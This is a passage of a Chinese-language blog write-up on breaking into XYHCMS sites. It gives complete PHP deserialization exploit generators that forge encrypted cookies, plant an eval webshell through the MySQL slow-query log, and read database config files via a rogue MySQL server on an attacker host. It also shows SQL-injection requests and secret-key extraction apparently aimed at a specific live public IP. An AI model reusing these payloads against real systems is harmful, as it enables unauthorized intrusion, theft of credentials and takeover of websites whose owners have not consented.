class_">\Common\Lib\SysCrypt</span>(<span class="variable">$key</span>);</span><br><span class="line">	<span class="variable">$value</span> = <span class="variable">$sc</span>-&gt;<span class="title function_ invoke__">php_encrypt</span>(<span class="variable">$value</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">\Think\Image\Driver\Imagick</span>();</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">set_cookie</span>(<span class="variable">$b</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;%2B&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>生成序列化参数：</p>
<p><img src="fYTXF1j0zAW7xLY0_XL_3JjJDuz6l9FppNdLwjNsQlU.png" alt="image"></p>
<p>发送数据，成功伪造。</p>
<p><img src="E3fk_uE2hgCWH1pNmmWIlQhE-TrBubkoRt-GLGb-P88.png" alt="image"></p>
<p>查看结果</p>
<p><img src="PmVtCUB-IQ2Xk_BzDO6xleiXM2H7fHhOjSehl74smIA.png" alt="image"></p>
<h3 id="反序列化漏洞MySQL日志写shell"><a href="#反序列化漏洞MySQL日志写shell" class="headerlink" title="反序列化漏洞MySQL日志写shell"></a>反序列化漏洞MySQL日志写shell</h3><p>开启慢查询日志：</p>
<p><code>set global slow_query_log=1;</code></p>
<p>指定慢查询日志的位置：</p>
<p><code>set global slow_query_log_file=&#39;C:/phpstudy_pro/WWW/xyh.com/shell.php&#39;;</code></p>
<p>生成反序列化，然后构造之后发包请求，成功写入shell，（这里需要注意在一句话木马的变量传参中添加个转义“\”，不然不能完整写入）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Db</span>\<span class="title class_">Driver</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PDO</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">        PDO::<span class="variable constant_">MYSQL_ATTR_LOCAL_INFILE</span> =&gt; <span class="literal">true</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;dsn&quot;</span>    =&gt; <span class="string">&quot;mysql:host=localhost;dbname=xyhcms;port=3306&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;qweas123&quot;</span></span><br><span class="line">        );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span>   = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$pk</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$db</span> = <span class="literal">null</span>;</span><br><span class="line">	<span class="keyword">protected</span> <span class="variable">$poss</span> = <span class="string">&#x27;$_POST[1]&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="keyword">new</span> <span class="title class_">\Think\Db\Driver\Mysql</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pk = <span class="string">&#x27;luoke&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data[<span class="variable language_">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;xyh_admin_log&quot;</span>,</span><br><span class="line">        <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;id=0;select &#x27;&lt;?php @eval(\$_POST[1]);?&gt;&#x27; or sleep(11);&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Session</span>\<span class="title class_">Driver</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$handle</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle = <span class="keyword">new</span> <span class="title class_">\Think\Model</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Image</span>\<span class="title class_">Driver</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$img</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;img = <span class="keyword">new</span> <span class="title class_">\Think\Session\Driver\Memcache</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Common</span>\<span class="title class_">Lib</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SysCrypt</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$crypt_key</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$crypt_key</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable language_">$this</span> -&gt; crypt_key = <span class="variable">$crypt_key</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">php_encrypt</span>(<span class="params"><span class="variable">$txt</span></span>) </span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">srand</span>((<span class="keyword">double</span>)<span class="title function_ invoke__">microtime</span>() * <span class="number">1000000</span>);</span><br><span class="line">	   <span class="variable">$encrypt_key</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">32000</span>));</span><br><span class="line">	   <span class="variable">$ctr</span> = <span class="number">0</span>;</span><br><span class="line">	   <span class="variable">$tmp</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$txt</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">	 <span class="variable">$ctr</span> = <span class="variable">$ctr</span> == <span class="title function_ invoke__">strlen</span>(<span class="variable">$encrypt_key</span>) ? <span class="number">0</span> : <span class="variable">$ctr</span>;</span><br><span class="line">	    <span class="variable">$tmp</span> .= <span class="variable">$encrypt_key</span>[<span class="variable">$ctr</span>].(<span class="variable">$txt</span>[<span class="variable">$i</span>]^<span class="variable">$encrypt_key</span>[<span class="variable">$ctr</span>++]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="built_in">self</span>::<span class="title function_ invoke__">__key</span>(<span class="variable">$tmp</span>,<span class="variable">$this</span> -&gt; crypt_key));</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">php_decrypt</span>(<span class="params"><span class="variable">$txt</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$txt</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">__key</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$txt</span>),<span class="variable">$this</span> -&gt; crypt_key);</span><br><span class="line">	   <span class="variable">$tmp</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$txt</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">	 <span class="variable">$md5</span> = <span class="variable">$txt</span>[<span class="variable">$i</span>];</span><br><span class="line">	    <span class="variable">$tmp</span> .= <span class="variable">$txt</span>[++<span class="variable">$i</span>] ^ <span class="variable">$md5</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$tmp</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__key</span>(<span class="params"><span class="variable">$txt</span>,<span class="variable">$encrypt_key</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$encrypt_key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$encrypt_key</span>);</span><br><span class="line">	   <span class="variable">$ctr</span> = <span class="number">0</span>;</span><br><span class="line">	   <span class="variable">$tmp</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$txt</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">	 <span class="variable">$ctr</span> = <span class="variable">$ctr</span> == <span class="title function_ invoke__">strlen</span>(<span class="variable">$encrypt_key</span>) ? <span class="number">0</span> : <span class="variable">$ctr</span>;</span><br><span class="line">	    <span class="variable">$tmp</span> .= <span class="variable">$txt</span>[<span class="variable">$i</span>] ^ <span class="variable">$encrypt_key</span>[<span class="variable">$ctr</span>++];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$tmp</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="variable language_">$this</span> -&gt; crypt_key = <span class="literal">null</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_cookie</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$key</span> = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$key</span> = <span class="string">&#x27;iqQmhxkAU&#x27;</span>;</span><br><span class="line">	<span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$key</span>);</span><br><span class="line">	<span class="variable">$sc</span> = <span class="keyword">new</span> <span class="title class_">\Common\Lib\SysCrypt</span>(<span class="variable">$key</span>);</span><br><span class="line">	<span class="variable">$value</span> = <span class="variable">$sc</span>-&gt;<span class="title function_ invoke__">php_decrypt</span>(<span class="variable">$name</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_cookie</span>(<span class="params"><span class="variable">$args</span>, <span class="variable">$key</span> = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$key</span> = <span class="string">&#x27;iqQmhxkAU&#x27;</span>;</span><br><span class="line">	<span class="variable">$value</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$args</span>);</span><br><span class="line">	<span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$key</span>);</span><br><span class="line">	<span class="variable">$sc</span> = <span class="keyword">new</span> <span class="title class_">\Common\Lib\SysCrypt</span>(<span class="variable">$key</span>);</span><br><span class="line">	<span class="variable">$value</span> = <span class="variable">$sc</span>-&gt;<span class="title function_ invoke__">php_encrypt</span>(<span class="variable">$value</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">\Think\Image\Driver\Imagick</span>();</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">set_cookie</span>(<span class="variable">$b</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;%2B&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>至此成功在本地window搭建的phpstudy环境getshell</p>
<p><img src="t22_CJfnGW30lPSRUDfvHVW7eMb-apXIZJCG6FufS5A.png" alt="image"></p>
<h3 id="尝试线上环境"><a href="#尝试线上环境" class="headerlink" title="尝试线上环境"></a>尝试线上环境</h3><p>当我喜出望外拿这个方法到线上去测试的时候，发现现实是残酷的。</p>
<p>所有的请求都成功了，但是就是写不进shell。</p>
<p><img src="KRbUGAMappm9vWkUegnjQZ4IYxITmii9VlbjK-SrcLM.png" alt="image"></p>
<p><img src="uJ8rZ6J9WCZjVo2Tt8hwpxtKmU-0Hbvl_1fQ3MUjQ7I.png" alt="image"></p>
<p>于是放弃了，然后打算再重新捋一遍，然后在本地搭建模拟线上的环境。</p>
<h2 id="本地搭建宝塔环境测试"><a href="#本地搭建宝塔环境测试" class="headerlink" title="本地搭建宝塔环境测试"></a>本地搭建宝塔环境测试</h2><p>使用宝塔搭建完成靶场之后，开始前面的一系列反序列化堆叠注入日志写shell的操作。</p>
<p>发现也也不进去，看了一下是权限的问题，文件夹改成了777权限之后，成功写入shell</p>
<p><img src="DIQWoMJ_NVZj5nrH-RQxTIVoAzdfQ62PVEvBB6495ZU.png" alt="image"></p>
<p>尝试连接，发现没用访问权限</p>
<p><img src="g0QWjEryttjtJuLqTGada2w_u7wKAIvFLTspWp20pAg.png" alt="image"></p>
<p>使用chown更改属组之后，才能正常访问，也就是说想通过反序列化堆叠SQL日志写shell是几乎不可能的</p>
<p><img src="G52gO9m7CdHkMk_Wo9KYGDCpw5vZFkgOcqm0s9a7JiI.png" alt="image"></p>
<p><img src="VFsSqvesJ50Vn2TN92fkr8MqUInV_KZnG41nyF7GtlQ.png" alt="image"></p>
<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>开启伪静态：</p>
<p><img src="f-O0vnvwhniqcVbviV0Zk8EF_yrib_rJn6GCImABAVU.png" alt="image"></p>
<p>目前的情况是能够通过反序列化添加管理员进入后台，在本地尝试了多个网上找到的后台getshell都无果，打算开始看看代码有没有新的入口。前面测试写入shell访问的时候，发现会自动加载一会儿，然后跳出404.html页面。</p>
<p>在后台里面尝试上传的地方，可以添加上传类型txt,html。</p>
<p>直接查看404.html，查看到嵌入有一些php代码，是获取当前时间的一段代码，也就是说这一个页面极有可能也是可以进行php解析的。</p>
<p><img src="0GsCqcFShva7QmvL2RNG0h6us9HTnuAzEZxy9aeRgnk.png" alt="image"></p>
<p>当我尝试改为phpinfo的时候，发现了报错</p>
<p><img src="nqaOpSbz0k2443kllVsDMaymt_GLT7nRQuAoLTz9H08.png" alt="image"></p>
<p><img src="PFic_qL5EAPqSri-ky1mPd15hIjczPXv593voMBao-Q.png" alt="image"></p>
<p>查看了过滤的代码之后，这里过滤了php相关字符的一些危险字符。</p>
<p><img src="N8-whXEcfuPedGBGpLZuaOpBROakgXs9gPf7SyxeCeM.png" alt="image"></p>
<p><img src="HXlTS7g_bCuW5Y7ViN8w75f9lQpuhHpNFaA76FvBrJk.png" alt="image"></p>
<p>这时候尝试通过文件包含的方式去测试，在404.html页面中添加一些语句包含上传的一些代码，尝试解析。</p>
<p><img src="k552jfshUzyTNZKGWI3TWTNlTuA3e6ht9n82PwuqX8Y.png" alt="image"></p>
<p><img src="8ZKAeFw5nD-b_jmd5S27okLMWTWFcnpaZChBzXFEBLc.png" alt="image"></p>
<p>在页面输入一个不存在的文件，尝试访问让其跳转到404.html，然后再包含上传的文件进行解析。</p>
<p><img src="it2DAINURC-mlCZ3V5-y6_UvBnaIjVO3kjeM6BSfbOg.png" alt="image"></p>
<p>至此，成功getshell。</p>
<h1 id="外部打点"><a href="#外部打点" class="headerlink" title="外部打点"></a>外部打点</h1><h2 id="SQL注入拿key"><a href="#SQL注入拿key" class="headerlink" title="SQL注入拿key"></a>SQL注入拿key</h2><p>查询当前key:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//103.121.93.206/index.php/Api/Lt/alist?orderby[updatexml(1,concat(char(126),(select s_value from xyh_config limit 6,1),char(126)),1);]=1</span></span><br></pre></td></tr></table></figure>
<p><img src="OIsjH26DAQuNhwuKdMt2VeBS0zNvcmMOS1WgIyeJVJQ.png" alt="image"></p>
<p>通过日志查看结果：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//103.121.93.206/App/Runtime/Logs/Api/22_05_15.log</span></span><br></pre></td></tr></table></figure>
<p><img src="Ri8oqXFDAYHqHs45rNG6fdPIecZxDlGBhqCA3yKyUBU.png" alt="image"></p>
<p>拿到key为：P4tzizR6d</p>
<h2 id="反序列化漏洞利用"><a href="#反序列化漏洞利用" class="headerlink" title="反序列化漏洞利用"></a>反序列化漏洞利用</h2><p>注册一个会员：</p>
<p><img src="0434TErovOItsmPmfHF-sxPxo-gWTuZ-6ula6ewoftY.png" alt="image"></p>
<p><img src="SZBzPWuaEwg2KgMJ2DRfUCzUyQr1Z3D8sSosE8wvIDM.png" alt="image"></p>
<p>登录之后抓包</p>
<p><img src="WH2mecVyNJbzzoE1zOjrj2Xnblu3c2MXtYVfZG-CU44.png" alt="image"></p>
<p>伪造nickname的值</p>
<p><img src="L0WDvpOOl7LFw0pRaueeO3tCs65IYZOetUXuBXRcsC4.png" alt="image"></p>
<p><img src="kBKVzbAF5OEJ5xMoXEL8CFV0yQagBi7O-yLLsPPctdE.png" alt="image"></p>
<h2 id="恶意MySQL服务器读取数据库文件-1"><a href="#恶意MySQL服务器读取数据库文件-1" class="headerlink" title="恶意MySQL服务器读取数据库文件"></a>恶意MySQL服务器读取数据库文件</h2><p>让系统报错，拿到绝对路径：</p>
<p><code>http://103.121.93.206/App/Api/Conf/config.php</code></p>
<p>绝对路径：</p>
<p> <strong>&#x2F;www&#x2F;wwwroot&#x2F;<a target="_blank" rel="noopener" href="http://www.xycms.com/App/Api/Conf/config.php">www.xycms.com/App/Api/Conf/config.php</a></strong></p>
<p><img src="rXer-1yIWs82BGv9DM9qQ9AmKh53WyzgVFAUDiasgm8.png" alt="image"></p>
<p>查询知道xyhcms的数据库配置文件默认为：xyh.com\\App\\Common\\Conf\\db.php</p>
<p>结合上面知道的绝对路径进行构造：&#x2F;www&#x2F;wwwroot&#x2F;<a target="_blank" rel="noopener" href="http://www.xycms.com/App/Common/Conf/db.php">www.xycms.com/App/Common/Conf/db.php</a></p>
<p><img src="cO6t3NlvIIujDXefEUGaNu8WEcOoi2fulIREdXKlslg.png" alt="image"></p>
<p>使用poc生成反序列化payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Db</span>\<span class="title class_">Driver</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PDO</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">        PDO::<span class="variable constant_">MYSQL_ATTR_LOCAL_INFILE</span> =&gt; <span class="literal">true</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;dsn&quot;</span>    =&gt; <span class="string">&quot;mysql:host=your-vps;dbname=xyhcms;port=3307&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;123456&quot;</span></span><br><span class="line">        );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span>   = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$pk</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$db</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="keyword">new</span> <span class="title class_">\Think\Db\Driver\Mysql</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pk = <span class="string">&#x27;luoke&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data[<span class="variable language_">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;xyh_admin_log&quot;</span>,</span><br><span class="line">        <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;id=0;&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Session</span>\<span class="title class_">Driver</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$handle</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle = <span class="keyword">new</span> <span class="title class_">\Think\Model</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Image</span>\<span class="title class_">Driver</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$img</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;img = <span class="keyword">new</span> <span class="title class_">\Think\Session\Driver\Memcache</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Common</span>\<span class="title class_">Lib</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SysCrypt</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$crypt_key</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> 